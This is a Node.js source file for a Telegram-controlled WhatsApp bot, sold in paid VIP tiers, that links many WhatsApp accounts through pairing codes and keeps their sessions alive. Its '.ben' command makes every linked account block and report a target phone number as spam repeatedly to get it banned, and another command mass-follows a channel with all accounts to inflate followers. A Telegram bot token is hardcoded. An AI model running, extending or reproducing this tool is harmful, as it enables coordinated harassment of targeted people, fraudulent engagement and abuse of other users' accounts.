/**
 * 👑 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨 𝑽𝑰𝑷 - 𝑷𝑹𝑶 𝑬𝑫𝑰𝑻𝑰𝑶𝑵 👑
 * النسخة الجبارة المطورة - الإصدار النهائي المستقر
 * نظام إدارة الأجهزة الموزعة والحماية المتقدمة
 */

const { Telegraf, Markup } = require('telegraf');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    makeCacheableSignalKeyStore,
    jidNormalizedUser,
    delay,
    Browsers
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const pino = require('pino');
const express = require('express');

// ==========================================
// 🌐 خادم الويب للاستمرارية (Uptime)
// ==========================================
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('👑 TARZAN ULTRA PRO IS ACTIVE 👑'));
app.listen(PORT, () => console.log(`🌐 [SERVER] Listening on port ${PORT}`));

// ==========================================
// ⚙️ إعدادات النظام وقاعدة البيانات
// ==========================================
const TG_TOKEN = '8831436238:AAF9M5hGwNbQwfoLKOr_XYS2Qij6WOA7Krw'; 
const OWNER_ID = '8794826397'; 
const DB_FILE = './tarzan_master_db.json';

let db = { config: { mode: 'FREE' }, users: {}, sessions: {} };
if (fs.existsSync(DB_FILE)) {
    try { db = JSON.parse(fs.readFileSync(DB_FILE)); } 
    catch (e) { console.error("⚠️ Database error, starting fresh."); }
}
const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));

const activeSockets = {}; 
const userStates = {}; 

// ==========================================
// 🛡️ محرك الواتساب الجبار
// ==========================================

async function startWhatsAppSession(sessionId, phoneNumber = null, tgContext = null) {
    const sessionDir = path.join(__dirname, 'sessions', sessionId);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    
    const sock = makeWASocket({
        auth: { 
            creds: state.creds, 
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) 
        },
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Desktop'),
        syncFullHistory: false,
        markOnlineOnConnect: true
    });

    activeSockets[sessionId] = sock;
    sock.ev.on('creds.update', saveCreds);

    // 🔑 توليد كود الربط (Pairing)
    if (phoneNumber && !sock.authState.creds.registered) {
        await delay(3000);
        try {
            const cleanPhone = phoneNumber.replace(/[^0-9]/g, '');
            let code = await sock.requestPairingCode(cleanPhone);
            if (tgContext) {
                await tgContext.replyWithHTML(
                    `<b>🔱 كود الربط الجبار جاهز 🔱</b>\n\n` +
                    `🔑 الكود: <code>${code}</code>\n\n` +
                    `⚠️ ادخل الكود في واتساب (الأجهزة المرتبطة) لتفعيل القوة.`
                );
            }
        } catch (e) {
            if (tgContext) await tgContext.reply("❌ تعذر إصدار الكود، يرجى المحاولة لاحقاً.");
        }
    }

    // ⚔️ معالجة الأوامر من واتساب مباشرة
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const from = msg.key.remoteJid;
        const sender = msg.key.participant || msg.key.remoteJid;
        const body = (msg.message.conversation || msg.message.extendedTextMessage?.text || '').trim();

        // فحص الصلاحية (فقط المالك أو الرقم نفسه)
        const isOwner = sender.includes(OWNER_ID);

        // 💀 أمر المعالجة (.ben)
        if (body.startsWith('.ben ')) {
            const target = body.split(' ')[1];
            if (!target) return;
            const targetJid = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            
            await sock.sendMessage(from, { text: `⚔️ <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑺𝒀𝑺𝑻𝑬𝑴: 𝑨𝑻𝑻𝑨𝑪𝑲</b> ⚔️\n\n🎯 <b>المستهدف:</b> ${target}\n⚙️ جاري تشغيل كافة الأنظمة المتصلة للفتك بالهدف...` }, { quoted: msg });

            let hits = 0;
            const sockets = Object.values(activeSockets);

            for (const s of sockets) {
                for (let i = 0; i < 8; i++) { // هجمات مكثفة لكل حساب
                    try {
                        await s.updateBlockStatus(targetJid, 'block');
                        await s.reportSpam(targetJid);
                        hits++;
                        await delay(Math.floor(Math.random() * 500) + 300); // تأخير ذكي
                    } catch (e) {}
                }
            }
            await sock.sendMessage(from, { text: `✅ <b>تم سحق الهدف بنجاح</b>\n\n📈 مجموع الضربات: ${hits}\n🔗 عدد الأنظمة المشاركة: ${sockets.length}\n\n<i>الهدف الآن في قائمة الحظر السوداء.</i>` }, { quoted: msg });
        }

        // 📢 أمر المتابعة (.متابعه)
        if (body.startsWith('.متابعه ') || body.startsWith('.متابعة ')) {
            const link = body.split(' ')[1];
            if (!link || !link.includes('whatsapp.com/channel/')) return;
            const inviteCode = link.split('channel/')[1].split('/')[0];
            
            await sock.sendMessage(from, { text: `🔄 <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑺𝑼𝑷𝑷𝑶𝑹𝑻</b>\n\n⏳ جاري زيادة المتابعين من كافة الحسابات...` }, { quoted: msg });

            let followers = 0;
            for (const sId in activeSockets) {
                try {
                    const meta = await activeSockets[sId].newsletterMetadata("invite", inviteCode);
                    if (meta?.id) {
                        await activeSockets[sId].newsletterFollow(meta.id);
                        followers++;
                        await delay(700);
                    }
                } catch (e) {}
            }
            await sock.sendMessage(from, { text: `✅ <b>اكتمل الدعم</b>\n\n📈 متابعين جدد: ${followers}` }, { quoted: msg });
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            if (statusCode !== DisconnectReason.loggedOut) {
                setTimeout(() => startWhatsAppSession(sessionId), 5000);
            } else {
                delete activeSockets[sessionId];
                if (db.sessions[sessionId]) delete db.sessions[sessionId];
                try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (e) {}
                saveDB();
            }
        } else if (connection === 'open') {
            console.log(`✅ [SYSTEM READY] Session: ${sessionId}`);
            const selfId = jidNormalizedUser(sock.user.id);
            if (!db.sessions[sessionId]) db.sessions[sessionId] = { status: 'active' };
            if (!db.sessions[sessionId].welcomeSent) {
                await sock.sendMessage(selfId, { text: `👑 𝑻𝑨𝑹𝒁𝑨𝑵 𝑼𝑳𝑻𝑹𝑨 𝑽𝑰𝑷 👑\n\nتم تفعيل القوة الخارقة على هذا الرقم.\n\nأوامرك مطاعة يا سيدي.` });
                db.sessions[sessionId].welcomeSent = true;
                saveDB();
            }
        }
    });
}

// ==========================================
// 📱 لوحة تحكم التلجرام المتطورة
// ==========================================
const bot = new Telegraf(TG_TOKEN);

bot.start((ctx) => {
    const uid = ctx.from.id.toString();
    const isOwner = uid === OWNER_ID;
    const user = db.users[uid];
    const role = isOwner ? 'OWNER' : (user ? user.role : 'GUEST');

    if (db.config.mode === 'PAID' && role === 'GUEST') {
        return ctx.replyWithHTML("❌ <b>النظام مغلق للأعضاء VIP فقط</b>");
    }

    const buttons = [
        [Markup.button.callback('🔗 ربط جهاز جديد', 'action_pair')],
        [Markup.button.callback('📊 حالة السيرفر', 'server_status')]
    ];

    if (role === 'OWNER' || role === 'RESELLER') {
        buttons.push([Markup.button.callback('🎫 تفعيل VIP', 'action_add_vip')]);
    }
    
    if (role === 'OWNER') {
        buttons.push([
            Markup.button.callback(db.config.mode === 'FREE' ? '🟢 وضع مجاني' : '🔓 تفعيل المجاني', 'mode_free'), 
            Markup.button.callback(db.config.mode === 'PAID' ? '🔴 وضع VIP' : '🔐 تفعيل VIP', 'mode_paid')
        ]);
    }

    ctx.replyWithHTML(
        `🔱 <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑷𝑹𝑶 𝑺𝒀𝑺𝑻𝑬𝑴</b> 🔱\n\n` +
        `👤 الرتبة: <b>${role}</b>\n` +
        `🔗 الأجهزة النشطة: <b>${Object.keys(activeSockets).length}</b>\n\n` +
        `<i>اختر إجراءك القادم:</i>`,
        Markup.inlineKeyboard(buttons)
    );
});

bot.action('action_pair', (ctx) => {
    userStates[ctx.from.id] = { action: 'WAIT_PHONE' };
    ctx.replyWithHTML("📱 <b>أرسل الرقم مع مفتاح الدولة (مثال: 967xxx):</b>");
});

bot.action('server_status', (ctx) => {
    ctx.replyWithHTML(`📊 <b>التقرير الفني:</b>\n- الأجهزة: ${Object.keys(activeSockets).length}\n- الذاكرة: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB\n- الحالة: مستقر ✅`);
});

bot.on('text', async (ctx) => {
    const uid = ctx.from.id;
    const state = userStates[uid];
    if (!state) return;

    if (state.action === 'WAIT_PHONE') {
        const phone = ctx.message.text.trim().replace(/[^0-9]/g, '');
        ctx.reply("⏳ جاري تحضير الجلسة الجبارة...");
        await startWhatsAppSession(`SID_${Date.now()}`, phone, ctx);
        delete userStates[uid];
    }
});

// ==========================================
// 🚀 الإطلاق الكبير
// ==========================================
(async () => {
    const sDir = path.join(__dirname, 'sessions');
    if (!fs.existsSync(sDir)) fs.mkdirSync(sDir);
    
    const folders = fs.readdirSync(sDir).filter(f => fs.lstatSync(path.join(sDir, f)).isDirectory());
    for (const f of folders) {
        try { await startWhatsAppSession(f); await delay(2000); } catch (e) {}
    }
    
    bot.launch();
    console.log("✅ [SYSTEM] TARZAN PRO IS FULLY LOADED.");
})();

process.on('uncaughtException', (e) => console.error('Error:', e.message));
process.on('unhandledRejection', (e) => console.error('Rejection:', e.message));
